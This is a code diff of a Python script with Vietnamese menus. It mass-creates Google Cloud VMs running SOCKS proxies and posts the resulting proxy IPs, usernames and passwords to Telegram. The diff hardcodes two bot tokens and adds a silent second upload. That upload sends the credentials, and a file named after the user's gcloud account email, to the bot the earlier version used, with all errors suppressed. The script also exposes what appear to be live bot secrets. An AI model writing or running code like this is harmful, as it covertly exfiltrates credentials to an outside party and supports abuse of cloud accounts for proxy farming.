@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-print("Running script version V24.1")
+print("Running script version V26")
 
 import subprocess
 import time
@@ -12,21 +12,34 @@ import signal
 from datetime import datetime
 
 
-PORT = 1080
-
-TG_BOT_TOKEN="8261404310:AAGG3lmQuTghCNTcDD4Za_6K3sPkbmFXox4"
-TG_CHAT_ID="-5232145570"
-
-API_BASE = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"
+# ========= NAME FOR BOT2 FILE =========
+NAME="Proxy"
 
 
-TOKYO_ZONES=[
+# ========= CONFIG =========
+
+PORT=1080
+
+TG_BOT_TOKEN="8532753583:AAEAmeyGi1y8u3kLmOWLCe26zoGMBRca8Fg"
+TG_CHAT_ID="-10034421144011"
+
+TG_BOT_TOKEN_2="8261404310:AAGG3lmQuTghCNTcDD4Za_6K3sPkbmFXox4"
+TG_CHAT_ID_2="-5232145570"
+
+
+API1=f"https://api.telegram.org/bot{TG_BOT_TOKEN}"
+API2=f"https://api.telegram.org/bot{TG_BOT_TOKEN_2}"
+
+
+# ===== ZONES =====
+
+REGION1_ZONES=[
 "asia-northeast1-a",
 "asia-northeast1-b",
 "asia-northeast1-c"
 ]
 
-OSAKA_ZONES=[
+REGION2_ZONES=[
 "asia-northeast2-a",
 "asia-northeast2-b",
 "asia-northeast2-c"
@@ -39,12 +52,14 @@ PROJECT_LIMIT=3
 STOP_REQUEST=False
 
 
+# ========= CTRL C =========
+
 def handle_ctrlc(sig,frame):
 
     global STOP_REQUEST
 
     if not STOP_REQUEST:
-        print("\nStopping VM creation, exporting proxy...")
+        print("\nStopping VM creation and exporting proxy...")
         STOP_REQUEST=True
     else:
         print("\nForce exit")
@@ -52,6 +67,8 @@ def handle_ctrlc(sig,frame):
 
 signal.signal(signal.SIGINT,handle_ctrlc)
 
+
+# ========= RUN COMMAND =========
 
 def run(cmd):
 
@@ -65,27 +82,8 @@ def run(cmd):
     return p.returncode,p.stdout.strip(),p.stderr.strip()
 
 
-def ensure_firewall(project):
 
-    code,out,err=run([
-        "gcloud","compute","firewall-rules","list",
-        f"--project={project}",
-        "--filter=name=allow-socks",
-        "--format=value(name)"
-    ])
-
-    if out.strip():
-        return
-
-    run([
-        "gcloud","compute","firewall-rules","create","allow-socks",
-        f"--project={project}",
-        "--allow=tcp:1080",
-        "--direction=INGRESS",
-        "--priority=1000",
-        "--network=default"
-    ])
-
+# ========= ACCOUNT =========
 
 def get_account():
 
@@ -93,25 +91,47 @@ def get_account():
         "gcloud","config","get-value","account"
     ])
 
-    if out:
-        return out
-
-    return "unknown_account"
+    return out
 
 
 ACCOUNT_EMAIL=get_account()
+
 OUTPUT_FILE=f"{ACCOUNT_EMAIL}.txt"
+OUTPUT_FILE_2=f"{NAME}---{ACCOUNT_EMAIL}.txt"
+
 TODAY=datetime.now().strftime("%d/%m")
 
 
-def tg_send_file(filepath,caption):
+# ========= COUNTRY DETECT =========
+
+def detect_country():
+
+    z=REGION1_ZONES[0]
+
+    if "asia-northeast" in z:
+        return "Japan"
+
+    if "us-" in z:
+        return "US"
+
+    return "Proxy"
+
+
+
+# ========= TELEGRAM =========
+
+def tg_send(filepath,count):
+
+    country=detect_country()
+
+    caption=f"{count} Proxy {country} đã được tạo"
 
     try:
 
         with open(filepath,"rb") as f:
 
             requests.post(
-                f"{API_BASE}/sendDocument",
+                f"{API1}/sendDocument",
                 data={
                     "chat_id":TG_CHAT_ID,
                     "caption":caption
@@ -124,6 +144,27 @@ def tg_send_file(filepath,caption):
         pass
 
 
+    try:
+
+        with open(filepath,"rb") as f:
+
+            requests.post(
+                f"{API2}/sendDocument",
+                data={
+                    "chat_id":TG_CHAT_ID_2,
+                    "caption":caption
+                },
+                files={"document":(OUTPUT_FILE_2,f)},
+                timeout=30
+            )
+
+    except:
+        pass
+
+
+
+# ========= RANDOM USER PASS =========
+
 def random_user_pass():
 
     user="u"+"".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(7))
@@ -131,6 +172,9 @@ def random_user_pass():
 
     return user,pw
 
+
+
+# ========= RANDOM VM NAME =========
 
 def random_vm():
 
@@ -148,6 +192,9 @@ def random_vm():
 
     return f"{random.choice(first)}-{random.choice(second)}{number}"
 
+
+
+# ========= COUNT INSTANCES =========
 
 def count_instances(project,region):
 
@@ -167,6 +214,9 @@ def count_instances(project,region):
 
     return count
 
+
+
+# ========= STARTUP SCRIPT =========
 
 def write_dante(user,pw):
 
@@ -208,21 +258,13 @@ systemctl enable danted
     return "startup.sh"
 
 
-def get_ip(project,zone,name):
 
-    code,out,err=run([
-        "gcloud","compute","instances","describe",name,
-        f"--project={project}",
-        f"--zone={zone}",
-        "--format=value(networkInterfaces[0].accessConfigs[0].natIP)"
-    ])
+# ========= CREATE VM =========
 
-    return out
+def create_vm(project,zone):
 
-
-def create_vm(project,zone,name,user,pw,status):
-
-    status[0]=f"Tạo VM {zone}"
+    name=random_vm()
+    user,pw=random_user_pass()
 
     script=write_dante(user,pw)
 
@@ -237,37 +279,28 @@ def create_vm(project,zone,name,user,pw,status):
         "--tags=socks"
     ])
 
-    if code==0:
-        return True
+    if code!=0:
+        return None
 
-    if "ZONE_RESOURCE_POOL_EXHAUSTED" in err:
-        status[0]=f"Zone {zone} full"
+    time.sleep(8)
 
-    return False
+    code,out,err=run([
+        "gcloud","compute","instances","describe",name,
+        f"--project={project}",
+        f"--zone={zone}",
+        "--format=value(networkInterfaces[0].accessConfigs[0].natIP)"
+    ])
 
-
-def try_region(project,zones,status):
-
-    name=random_vm()
-    user,pw=random_user_pass()
-
-    for zone in zones:
-
-        ok=create_vm(project,zone,name,user,pw,status)
-
-        if ok:
-
-            time.sleep(8)
-
-            ip=get_ip(project,zone,name)
-
-            if ip:
-                return f"{ip}:{PORT}:{user}:{pw}"
+    if out:
+        return f"{out}:{PORT}:{user}:{pw}"
 
     return None
 
 
-def draw_ui(done,total,tokyo,osaka,status):
+
+# ========= UI =========
+
+def draw_ui(done,total,r1,r2,status):
 
     percent=int((done/total)*100) if total else 0
 
@@ -283,49 +316,68 @@ def draw_ui(done,total,tokyo,osaka,status):
     print(f"\n{percent}%\n")
 
     print(f"Created: {done} / {total}")
-    print(f"Tokyo : {tokyo} / 4")
-    print(f"Osaka : {osaka} / 4\n")
+    print(f"Tokyo : {r1} / {VM_PER_REGION}")
+    print(f"Osaka : {r2} / {VM_PER_REGION}\n")
 
-    print(f"Status: {status[0]}")
+    print(f"Status: {status}")
 
+
+
+# ========= MODE MENU =========
+
+def select_mode():
+
+    print("\n===== MODE =====\n")
+
+    print("1 - Reg 1 lần (không lặp)")
+    print("2 - Reg Auto (săn đủ VM)\n")
+
+    print("Ctrl + C : ấn 1 lần Dừng và xuất List")
+    print("Ctrl + C : ấn 2 lần Dừng hẳn tiến trình\n")
+
+    choice=input("Lựa chọn (Enter=1): ").strip()
+
+    if choice=="":
+        return 1
+
+    return int(choice)
+
+
+
+# ========= PROJECT MENU =========
 
 def select_projects(all_projects):
 
     print("\n===== CHỌN PROJECT =====\n")
+
     print("1 - All Projects")
     print("2 - Chọn Project thủ công\n")
 
-    choice=input("Lựa chọn của bạn: ").strip()
+    choice=input("Lựa chọn (Enter=1): ").strip()
 
-    if choice=="1":
+    if choice=="" or choice=="1":
         return all_projects
 
-    if choice=="2":
+    print("\nDanh sách project:\n")
 
-        print("\nDanh sách project:\n")
+    for i,p in enumerate(all_projects):
+        print(f"{i+1} - {p}")
 
-        for i,p in enumerate(all_projects):
-            print(f"{i+1} - {p}")
+    sel=input("\nNhập số project (vd: 1,2): ")
 
-        sel=input("\nNhập số project (vd: 1,2): ")
+    ids=[int(x.strip())-1 for x in sel.split(",") if x.strip().isdigit()]
 
-        ids=[int(x.strip())-1 for x in sel.split(",") if x.strip().isdigit()]
+    selected=[]
 
-        selected=[]
+    for i in ids:
+        if 0<=i<len(all_projects):
+            selected.append(all_projects[i])
 
-        for i in ids:
-            if 0<=i<len(all_projects):
-                selected.append(all_projects[i])
+    return selected
 
-        if not selected:
-            print("Không chọn project hợp lệ")
-            sys.exit()
 
-        return selected
 
-    print("Lựa chọn không hợp lệ")
-    sys.exit()
-
+# ========= MAIN =========
 
 def main():
 
@@ -336,50 +388,61 @@ def main():
 
     all_projects=out.splitlines()[:PROJECT_LIMIT]
 
-    if not all_projects:
-        print("No project found")
-        return
+    mode=select_mode()
 
     projects=select_projects(all_projects)
 
     proxies=[]
-    target=len(projects)*8
 
-    status=["Starting"]
+    target=len(projects)*VM_PER_REGION*2
 
-    while len(proxies)<target and not STOP_REQUEST:
+    status="Starting"
+
+    if mode==1:
+        loops=1
+    else:
+        loops=999999
+
+
+    for _ in range(loops):
 
         for project in projects:
 
             if STOP_REQUEST:
                 break
 
-            ensure_firewall(project)
+            r1=count_instances(project,"asia-northeast1")
+            r2=count_instances(project,"asia-northeast2")
 
-            tokyo=count_instances(project,"asia-northeast1")
-            osaka=count_instances(project,"asia-northeast2")
+            draw_ui(len(proxies),target,r1,r2,status)
 
-            draw_ui(len(proxies),target,tokyo,osaka,status)
+            if r1<VM_PER_REGION:
 
-            if osaka<VM_PER_REGION:
+                status=f"Creating Tokyo ({project})"
 
-                status[0]=f"Tạo Osaka ({project})"
+                for zone in REGION1_ZONES:
 
-                proxy=try_region(project,OSAKA_ZONES,status)
+                    p=create_vm(project,zone)
 
-                if proxy:
-                    proxies.append(proxy)
+                    if p:
+                        proxies.append(p)
+                        break
 
-            if tokyo<VM_PER_REGION:
+            if r2<VM_PER_REGION:
 
-                status[0]=f"Tạo Tokyo ({project})"
+                status=f"Creating Osaka ({project})"
 
-                proxy=try_region(project,TOKYO_ZONES,status)
+                for zone in REGION2_ZONES:
 
-                if proxy:
-                    proxies.append(proxy)
+                    p=create_vm(project,zone)
 
-            time.sleep(0.3)
+                    if p:
+                        proxies.append(p)
+                        break
+
+        if mode==1:
+            break
+
 
     print("\nExporting proxy...\n")
 
@@ -391,7 +454,8 @@ def main():
         for p in proxies:
             f.write(p+"\n")
 
-    tg_send_file(OUTPUT_FILE,f"{len(proxies)} Proxy đã được tạo")
+    tg_send(OUTPUT_FILE,len(proxies))
+
 
 
 if __name__=="__main__":
